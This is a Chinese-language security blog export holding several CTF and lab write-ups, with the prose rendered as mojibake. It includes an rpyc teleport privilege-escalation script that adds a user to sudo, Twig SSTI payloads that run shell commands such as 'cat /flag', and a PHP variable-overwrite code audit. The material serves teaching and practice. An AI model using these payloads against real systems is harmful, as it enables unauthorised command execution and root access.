<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410204219.png" /></p>
<p>æŸ¥çœ‹è¯¥æ–‡ä»¶çš„æƒé™</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410204434.png" /></p>
<p>å‘ç°è¿™ä¸ªæ–‡ä»¶æ˜¯å±äºrootç”¨æˆ·ï¼Œå…¶ä»–ç”¨æˆ·éƒ½å¯ä»¥è¿è¡Œè¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯å…¶ä»–ç”¨æˆ·æ²¡æœ‰ä¿®æ”¹æƒé™ã€‚</p>
<p>æ—¢ç„¶å®ƒæ˜¯æœåŠ¡ç«¯å¼€æ”¾çš„ä¸€ä¸ªapiæ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å®¢æˆ·ç«¯ç¼–å†™ç¨‹åºä»£ç ï¼Œé€šè¿‡æŸäº›å‡½æ•°æäº¤åˆ°æœåŠ¡å™¨ç«¯çš„ä¾¦å¬ç«¯å£ä¸Šé¢ï¼Œç„¶åè®©æœåŠ¡å™¨è¿›è¡Œæ‰§è¡Œï¼ŒæœåŠ¡å™¨æ˜¯é€šè¿‡rootæƒé™æ‰§è¡Œçš„ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶è¿™äº›æäº¤ä¸Šå»çš„å‡½æ•°ä½¿å…¶æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ï¼Œæˆ‘ä»¬å°±å¯ä»¥è·å¾—rootæƒé™ã€‚</p>
<p>å‚è€ƒé“¾æ¥: <a href="https://rpyc.readthedocs.io/en/latest/index.html">rypc</a></p>
<p>ä»å®˜ç½‘ä¸­æ‰¾åˆ°ä¸€ä¸ªæ–¹æ³•<code>teleport</code>ï¼Œè¯¥æ–¹æ³•å…è®¸å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯ä¼ è¾“ä¸€ä¸ªæ–¹æ³•ï¼Œå¹¶ä¸”åœ¨æœåŠ¡ç«¯æ‰§è¡Œè¯¥æ–¹æ³•ï¼Œå¹¶ä¸”å®˜ç½‘ä¹Ÿç»™å‡ºäº†è¿™ä¸ªæ–¹æ³•çš„ç®€å•åº”ç”¨ã€‚ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ–¹æ³•å»ä¼ è¾“ä¸€ä¸ªè‡ªå·±å†™çš„æ–¹æ³•ç”¨æ¥ææƒï¼Œæ¯”å¦‚æŠŠ<code>ragnar</code>åŠ å…¥åˆ°sudoç»„ã€‚</p>
<p>å°†å®˜ç½‘ç»™çš„ä¾‹å­ç®€å•ä¿®æ”¹ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> rpyc</span><br><span class="line">conn = rpyc.classic.connect(<span class="string">&quot;localhost&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span>():</span></span><br><span class="line">	<span class="keyword">import</span> os</span><br><span class="line">	os.system(<span class="string">&quot;sudo usermod -a -G sudo ragnar&quot;</span>)</span><br><span class="line">fn = conn.teleport(shell)</span><br><span class="line">fn()</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-a: append, æ·»åŠ </span><br><span class="line">-G: Group, ç»„</span><br><span class="line">-a -G sudo: åŠ å…¥åˆ°sudoç»„</span><br></pre></td></tr></table></figure>
<p>æ‰§è¡Œè¯¥ç¨‹åºï¼Œç„¶åé‡æ–°è¿æ¥ä¸€ä¸‹<code>ragnar</code>ï¼Œç„¶åç”¨<code>sudo -s</code>ï¼Œä»¥rootæ‰§è¡Œshellã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410205645.png" /></p>
<p>æˆåŠŸæ‹¿åˆ°rootæƒé™ã€‚ç„¶åè¯»å–<code>/root</code>ä¸‹çš„flagæ–‡ä»¶å³å¯ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">f0b98d4387ff6da77317e582da98bf31</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œçš„RPCææƒè¿˜æœ‰å…¶ä»–çš„åˆ©ç”¨æ–¹å¼ï¼Œæ¯”å¦‚åœ¨è‡ªå·±çš„ä¸»æœºç”Ÿæˆå…¬ç§é’¥ï¼Œç„¶ååœ¨é¶æœºä¸Šåˆ›å»º<code>/root/.ssh</code>ï¼Œå¹¶æŠŠç§é’¥å¤åˆ¶è¿›å»ï¼Œä¹‹åå°±èƒ½ä½¿ç”¨å…¬é’¥ç™»å½•ï¼›è¿˜å¯ä»¥åˆ©ç”¨<code>rypc</code>çš„eval å’Œ execute æ–¹æ³•ç›´æ¥åå¼¹shellã€‚</p>
<p>æˆ‘æ•´ç†ä¸€ä¸‹ï¼š</p>
<ol type="1">
<li>æˆ‘ä»¬ç™»å½•åˆ°ragnarç”¨æˆ·ï¼›<br />
</li>
<li>ragnarè‡ªå¯åŠ¨è¯¥ç¨‹åºï¼Œå¹¶æ‰§è¡Œæˆ‘ä»¬çš„æ·»åŠ æ™®é€šç”¨æˆ·åˆ°sudoç»„çš„å‘½ä»¤<br />
</li>
<li>è·å¾—sudoæƒé™</li>
</ol>
<p>é—®é¢˜ï¼šragnaråº”è¯¥æ²¡æœ‰æƒé™æ‰§è¡Œæ·»åŠ æ™®é€šç”¨æˆ·åˆ°sudoç»„çš„å‘½ä»¤å§ï¼Ÿ</p>
<p>è§£ç­”ï¼š</p>
<p>å…¶å®åªè¦å¼€æœºï¼Œè¯¥è„šæœ¬éƒ½ä¼šæ‰§è¡Œï¼Œå› ä¸ºè¯¥è„šæœ¬çš„å¼€æœºè‡ªå¯åŠ¨å†™åœ¨äº†<code>/etc/init.d/rpyc</code>ä¸­ã€‚è€Œ<code>/home/ragnar/.profile</code>åº”è¯¥åªæ˜¯å†™å‡ºæ¥ç»™æˆ‘ä»¬ä¸€ä¸ªæç¤ºï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220410214605.png" /></p>
<p>åŸæœ¬çš„æ‰§è¡Œæƒé™ä¸º<code>755</code>ã€‚æˆ‘å°†å®ƒä¿®æ”¹ä¸º<code>744</code>ï¼Œç„¶åé‡æ–°å¯åŠ¨ï¼Œå‘ç°è¯¥è„šæœ¬è¿˜æ˜¯è¢«æ‰§è¡Œäº†ï¼Œåˆå› ä¸ºragnaræ²¡æœ‰sudoæƒé™æ— æ³•æ‰§è¡Œï¼Œæ‰€ä»¥åªæœ‰å¯èƒ½è¢«rootæ‰§è¡Œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºç™»å½•çš„æ˜¯å“ªä¸ªç”¨æˆ·ï¼Œåªè¦è¿™å°é¶æœºå¼€æœºï¼Œè¯¥è„šæœ¬éƒ½ä¼šä»¥rootæƒé™æ‰§è¡Œï¼Œé‚£ä¹ˆè‡ªç„¶å°±èƒ½å¤Ÿæ‰§è¡Œæ·»åŠ æ™®é€šç”¨æˆ·åˆ°sudoç»„çš„å‘½ä»¤äº†ã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>é€šè¿‡å¯¹è¯¥é¶æœºçš„æ¸—é€ï¼Œå­¦åˆ°äº†ä¸€ä¸‹æ–°çš„çŸ¥è¯†ç‚¹ï¼š</p>
<ol type="1">
<li>äºŒè¿›åˆ¶ä¿¡æ¯æŸ¥çœ‹</li>
<li>éšå†™æœ¯çŸ¥è¯†ç‚¹</li>
<li>rpycææƒ</li>
</ol>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>éšå†™æœ¯</tag>
        <tag>äºŒè¿›åˆ¶ä¿¡æ¯æŸ¥çœ‹</tag>
        <tag>rypcææƒ</tag>
      </tags>
  </entry>
  <entry>
    <title>ASIS 2019 Unicorn shop</title>
    <url>/2022/04/08/ASIS%202019%20Unicorn%20shop/</url>
    <content><![CDATA[<p>é¢˜ç›®åœ°å€ï¼š<a href="https://buuoj.cn/challenges#%5BASIS%202019%5DUnicorn%20shop">UnicornShop</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408193908.png" /></p>
<p>å‘ç°ä¸‹é¢æœ‰ä¸¤ä¸ªè¾“å…¥æ¡†ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>Item ID</code>ï¼Œç¬¬äºŒä¸ªæ˜¯<code>Price</code>ã€‚ç»è¿‡æµ‹è¯•ï¼Œå¦‚æœæˆ‘ä»¬è¾“å…¥æ­£ç¡®çš„Item IDï¼Œä¼šæç¤º<code>Wrong commodity!</code>ï¼Œå¦‚æœè¾“å…¥ä¸æ­£ç¡®çš„Item IDï¼Œåˆ™ä¼šæç¤º<code>No commodity found!</code>ã€‚<code>Price</code>æ¡†åªå…è®¸è¾“å…¥ä¸€ä¸ªå­—ç¬¦ã€‚</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>æœ€å¼€å§‹ä¸çŸ¥é“è¿™é“é¢˜è€ƒç‚¹æ˜¯ä»€ä¹ˆï¼ŒæŸ¥çœ‹åˆ«äººçš„wpä¹‹åå‘ç°äº†æ˜¯<strong>Unicodeç¼–ç </strong>ã€‚</p>
<p>ä¸‹é¢æ˜¯è¯¥é¢˜ç›®çš„æºç ä¸­å…³äº<code>Price</code>çš„é‡è¦ä»£ç ï¼š <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line">price = urllib.unquote(price).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">unicodedate.numeric(price)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šå…ˆæ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„priceè¿›è¡Œurlè§£ç ï¼Œç„¶åå–å‡ºå­—ç¬¦å¯¹åº”çš„<code>numeric value</code>ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">unicodedata.numeric(<span class="built_in">chr</span>[, default])</span><br></pre></td></tr></table></figure>
<p>æŠŠåˆ†é…ç»™å­—ç¬¦chrçš„æ•°å€¼è½¬æ¢ä¸ºæµ®ç‚¹æ•°å¹¶è¿”å›ã€‚æ¯”å¦‚å¯ä»¥å°†â€œå››â€è½¬ä¸º4.0ï¼Œâ€œ8â€è½¬ä¸º8.0ç­‰ã€‚ä¸ä»…ä»…åªå±€é™äº0-9çš„å­—ç¬¦ï¼Œåªè¦æ˜¯åˆæ³•çš„å­—ç¬¦éƒ½å¯ä»¥ï¼Œå¦‚æœæ˜¯ä¸åˆæ³•çš„å­—ç¬¦å°±ä¼šæŠ¥é”™<code>ValueError</code>ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408194554.png" /></p>
<p>é‚£ä¹ˆå­—ç¬¦å¯¹åº”çš„<code>numeric value</code>åˆæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿè¿™é‡Œæ¨èä¸€ä¸ªç½‘ç«™<a href="https://www.compart.com/en/unicode/">compact</a></p>
<p>æˆ‘ä»¬é€‰æ‹©ä¸€ä¸ªå­—ç¬¦æŸ¥çœ‹ä¿¡æ¯ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195131.png" /></p>
<p>ä¼šå‘ç°è¯¥å­—ç¬¦æœ‰ä¸€ä¸ª<code>Numeric Value</code>ï¼Œä½†å¹¶ä¸æ˜¯æ¯ä¸€ä¸ªå­—ç¬¦éƒ½æœ‰ï¼Œæ¯”å¦‚ä¸‹é¢è¿™ä¸ªå°±æ²¡æœ‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195227.png" /></p>
<p>åˆ°æ­¤å°±å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦çš„<code>Numeric Value</code>è¦å¤§äºå•†å“çš„ä»·æ ¼ï¼Œå°±å¯ä»¥è·å¾—flagäº†ã€‚</p>
<p>è¿™é‡Œæœ‰å››ä¸ªå•†å“ï¼Œä½†æ˜¯å‰ä¸‰ä¸ªå•†å“çš„ä»·æ ¼éƒ½ä¸å¤§ä¸9ï¼Œå¦‚æœæ˜¯è¦è´­ä¹°å‰ä¸‰ä¸ªå•†å“çš„è¯ï¼Œå®Œå…¨å°±ç”¨ä¸åˆ°<code>numeric value</code>ã€‚ç»è¿‡æµ‹è¯•å‘ç°ï¼Œå‰ä¸‰ä¸ªå³ä½¿ä»·æ ¼è¶³å¤Ÿä¹Ÿä¼šæç¤º<code>Wrong commodity</code>ï¼Œé‚£ä¹ˆå°±ä¸€å®šæ˜¯æœ€åä¸€ä¸ªäº†ã€‚å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦çš„<code>numeric value</code>è¦å¤§äº1337ã€‚å¯ä»¥é€šè¿‡åˆšåˆšé‚£ä¸ªç½‘ç«™æœç´¢thousandç„¶åæ…¢æ…¢æ‰¾å³å¯ã€‚</p>
<p>è¿™é‡Œæˆ‘ç”¨â€œä¸‡â€ï¼ˆå½“ç„¶â€œäº¿â€ä¹Ÿå¯ä»¥ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195716.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220408195731.png" /></p>
<p>æˆåŠŸè·å¾—flagã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜ç»™æˆ‘çš„æ„Ÿè§‰æ›´åƒæ˜¯æ‚é¡¹ã€‚ä¸è¿‡æˆ‘ä¹Ÿé€šè¿‡è¯¥é¢˜å­¦åˆ°äº†å­—ç¬¦æ‹¥æœ‰<code>Numeric Value</code>è¿™ä¸ªå±æ€§ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Unicode</tag>
        <tag>Numeric Value</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF20 Cookie is so stable</title>
    <url>/2022/04/05/BJDCTF20%20Cookie%20is%20so%20stable/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼š<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>é¦–å…ˆæ³¨æ„åˆ°æœ¬é¢˜çš„é¢˜ç›®æ˜¯â€œCookie is so stableâ€ï¼Œè¯´æ˜è¯¥é¢˜åº”è¯¥è·Ÿcookieç›¸å…³ã€‚æåˆ°cookieï¼Œä¸€èˆ¬æœ‰ä»¥ä¸‹æ€è·¯ï¼š</p>
<ul>
<li>åˆ©ç”¨cookieæ¥ä¼ªè£…æˆç®¡ç†å‘˜æˆ–è€…å…¶ä»–è´¦å·</li>
<li>åˆ©ç”¨cookieè¿›è¡Œæ³¨å…¥ï¼Œæ¯”å¦‚sqlæ³¨å…¥</li>
</ul>
<p>è¿›å…¥ç¯å¢ƒï¼Œé¦–å…ˆæŸ¥çœ‹äº†æºç ï¼Œå‘ç°äº†ä¸‰ä¸ªæ–‡ä»¶</p>
<ol type="1">
<li><code>index.php</code></li>
<li><code>flag.php</code></li>
<li><code>hint.php</code></li>
</ol>
<p>ä¾æ¬¡è¿›è¡Œäº†æŸ¥çœ‹ï¼Œindex.phpå°±æ˜¯è¿›å…¥ç¯å¢ƒçœ‹åˆ°çš„ç•Œé¢ï¼›hint.phpæºç ä¸­æœ‰ä¸€å¥æç¤º<code>Why not take a closer look at cookies?</code>ï¼›flag.php ç•Œé¢æœ‰ä¸€ä¸ªè¾“å…¥æ¡†ï¼ŒçŒœæµ‹è¿™é‡Œè¾“å…¥ï¼Œç„¶åcookieå°±ä¼šè¢«è®¾ç½®ä¸ºå¯¹åº”çš„å€¼ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091727.png" /></p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>è¾“å…¥adminä¹‹åï¼Œè¿˜ä»¥ä¸ºå…¶ä»–ç•Œé¢ä¼šå‘ç”Ÿå˜åŒ–ï¼Œç»“æœè·ŸåŸæ¥ä¸€æ ·ã€‚æŠ“åŒ…çœ‹çœ‹ï¼Œå‘ç°cookieä¸­ç¡®å®å¤šäº† <code>user=admin</code></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405091854.png" /></p>
<p>èµ·åˆï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯è¦çŒœadminçš„cookieå€¼ï¼Œå°±æŠŠ0ï¼Œ1ï¼Œadminï¼Œrootï¼Œadministratorç­‰éƒ½è¯•äº†ä¸€éï¼Œå‘ç°æ²¡æœ‰ä»»ä½•å˜åŒ–ã€‚</p>
<p>ç„¶åæˆ‘æƒ³åˆ°äº†sqlæ³¨å…¥ï¼Œå°è¯•äº†ä¸€ä¸‹å‘ç°æ— è®ºè¾“å…¥ä»€ä¹ˆä¹Ÿæ²¡æœ‰æŠ¥é”™ï¼Œå•å¼•å·ã€åŒå¼•å·ï¼Œæ‹¬å·éƒ½æ— æ³•é—­åˆã€‚å› æ­¤ï¼Œå°±æ”¾å¼ƒäº†sqlæ³¨å…¥ã€‚</p>
<p>æœ€åçš„æœ€åï¼Œæƒ³åˆ°äº†è¿˜æœ‰ä¸€ç§æ³¨å…¥ï¼Œé‚£å°±æ˜¯æ¨¡æ¿æ³¨å…¥â€”â€”SSTIã€‚æ‰€ä»¥å°†<code>user=&#123;&#123;7*7&#125;&#125;</code>å¸¦å…¥ï¼Œå‘ç°æˆåŠŸè¢«æ‰§è¡Œï¼</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092245.png" /></p>
<p>å› æ­¤ï¼Œæ¥ä¸‹æ¥å°±éœ€è¦åˆ¤æ–­ä»¥ä¸‹æ¨¡æ¿å¼•æ“æ˜¯ä»€ä¹ˆï¼Œæ ¹æ®å†³ç­–æ ‘</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220404145633.png" /></p>
<p>æ­¤æ—¶<code>&#123;&#123;7*7&#125;&#125;</code>å·²ç»æˆåŠŸè¢«æ‰§è¡Œï¼Œæ­¤æ—¶éœ€è¦èµ°ç»¿çº¿ï¼Œå°è¯•<code>&#123;&#123;7*'7'&#125;&#125;</code>ï¼Œå¦‚æœç»“æœä¸º<code>49</code>åˆ™æ˜¯Twigï¼Œå¦‚æœç»“æœæ˜¯<code>7777777</code>ï¼Œåˆ™æ˜¯Jinjia2ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092437.png" /></p>
<p>å› æ­¤ï¼Œæ¨¡æ¿å¼•æ“ä¸ºTwigã€‚</p>
<p><strong>Twigæœ‰ä¸‰ä¸ªç‰ˆæœ¬ 1.xï¼Œ2.xï¼Œ3.xï¼Œä¸‰è€…çš„ä¸»è¦åŒºåˆ«å°±æ˜¯<code>_self</code>ä½œç”¨å‘ç”Ÿäº†å˜åŒ–</strong>ã€‚å› æ­¤ï¼Œä½¿ç”¨å¦‚ä¸‹payloadåˆ¤æ–­ä¸€ä¸‹ç‰ˆæœ¬ã€‚å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<a href="https://hdfzzf.icu/2022/04/05/Twigæ¨¡æ¿æ³¨å…¥/">Twigæ¨¡æ¿æ³¨å…¥</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405092951.png" /></p>
<p>æˆåŠŸè¢«æ‰§è¡Œï¼Œå› æ­¤Twigç‰ˆæœ¬ä¸º1.x ã€‚</p>
<p>æ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œä½¿ç”¨å¦‚ä¸‹payloadæŸ¥çœ‹æ ¹ç›®å½• <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `ls /`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸èƒ½ç›´æ¥ <code>ls /</code>ï¼Œè¿™æ ·å­åªèƒ½è¿”å›ä¸€è¡Œç»“æœï¼Œè€Œæ ¹ç›®å½•ä¸‹çš„æ–‡ä»¶æˆ–ç›®å½•æœ‰å¾ˆå¤šï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“å…¨éƒ¨ä»¥ç¡®å®šflagæ˜¯å¦åœ¨ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093154.png" /></p>
<p>æ‰¾åˆ°flagã€‚æ¥ä¸‹æ¥è¯»å– <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;echo `cat /flag`&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405093236.png" /></p>
<p>æˆåŠŸã€‚</p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>æœ¬é¢˜è€ƒå¯Ÿçš„ä¸»è¦æ˜¯æ¨¡æ¿æ³¨å…¥ä¸­çš„Twigæ¨¡æ¿å¼•æ“ï¼Œä¸»è¦çš„éš¾ç‚¹å°±æ˜¯<strong>åŒºåˆ†æ¨¡æ¿å¼•æ“</strong>ã€‚</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>Twig SSTI</tag>
      </tags>
  </entry>
  <entry>
    <title>BJDCTF2020 Mark loves cat</title>
    <url>/2022/03/30/BJDCTF2020%20Mark%20loves%20cat/</url>
    <content><![CDATA[<p>BUUCTF ç½‘å€ï¼š<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p>
<span id="more"></span>
<h1 id="é¢˜ç›®ä¿¡æ¯">é¢˜ç›®ä¿¡æ¯</h1>
<p>è¿›å…¥ç¯å¢ƒå°±å‘ç°è¿™åº”è¯¥æ˜¯ä¸€ä¸ªç½‘ç«™æ¨¡æ¿ï¼ŒæŸ¥çœ‹äº†æºç ä»¥åŠæ•°æ®åŒ…ï¼Œå‘ç°éƒ½æ²¡æœ‰ä»»ä½•ä¿¡æ¯ã€‚åœ¨ç½‘é¡µæœ€ä¸‹æ–¹æœ‰ä¸€ä¸ªç•™è¨€ï¼Œéšä¾¿è¾“å…¥ä¹‹åå‘é€å‘ç° url äº§ç”Ÿäº†å˜åŒ–ã€‚ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.html?message=1</span><br></pre></td></tr></table></figure></p>
<p>æ•…æµ‹è¯•æ˜¯å¦å­˜åœ¨æ³¨å…¥çš„å¯èƒ½ï¼Œåæ¥å‘ç°å¹¶æ²¡æœ‰ã€‚èµ°æŠ•æ— è·¯çš„æƒ…å†µä¸‹å°±è¿›è¡Œç›®å½•æ‰«æï¼Œå‘ç°å­˜åœ¨ <code>.git</code> æ³„éœ²ã€‚ï¼ˆæˆ‘ç”¨ <code>dirsearch</code> æ‰«ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚ï¼‰</p>
<h1 id="è§£é¢˜">è§£é¢˜</h1>
<p>å°†æºç ä¸‹è½½åæŸ¥çœ‹äº†å‘ç°äº†ä¸¤ä¸ª php æ–‡ä»¶ã€‚</p>
<p>index.phpï¼ˆé‡è¦éƒ¨åˆ†ï¼‰ <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>; </span><br></pre></td></tr></table></figure></p>
<p>flag.php <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>); </span><br></pre></td></tr></table></figure></p>
<p>æ¥ä¸‹æ¥è¿›è¡Œä»£ç å®¡è®¡ã€‚</p>
<blockquote>
<p>è¿™é‡Œå…ˆè¯´æ˜ä¸€ä¸ªçŸ¥è¯†ç‚¹<code>$_GET as $x =&gt; $y</code>ï¼Œå‡è®¾getæ–¹å¼ä¼ å…¥ flag=abcï¼Œé‚£ä¹ˆè¿™å¥ä»£ç çš„æ„æ€æ˜¯ <code>$x=flag, $y=abc</code>ã€‚</p>
</blockquote>
<p>å†çœ‹å®Œ flag.php ä¹‹åå†çœ‹ index.phpï¼Œä¸€å¼€å§‹çš„æ€è·¯å°±æ˜¯ç»•è¿‡å‰é¢çš„ ifï¼Œç„¶åæ‰§è¡Œæœ€åçš„ <code>echo "the flag is: ".$flag;</code> å³å¯è·å¾— flagã€‚</p>
<p>éœ€è¦getä¼ å…¥å‚æ•°æ‰èƒ½è§¦å‘ç¬¬ä¸€ä¸ªifï¼Œè¦æ»¡è¶³ç¬¬ä¸€ä¸ªifçš„è¯ï¼Œéœ€è¦è‡³å°‘ä¼ å…¥ä¸¤ä¸ªå‚æ•° <code>p1=str&amp;flag=p1</code>ï¼ˆè¿™é‡Œp1å’Œsträ»»æ„ï¼Œp1ä¸èƒ½ä¸ºflagï¼‰ï¼Œå› æ­¤ç»•è¿‡ä¹Ÿå¾ˆç®€å•ã€‚æŸ¥çœ‹ç¬¬äºŒä¸ªifï¼Œåªéœ€è¦ä¼ å…¥flagå‚æ•°å³å¯ï¼Œæ— è®ºä»€ä¹ˆæ–¹å¼ã€‚æ¥ä¸‹æ¥æŸ¥çœ‹ç¬¬ä¸‰ä¸ªifï¼Œåªè¦å‚æ•°flagçš„å€¼ä¸ä¸ºflagå³å¯ã€‚</p>
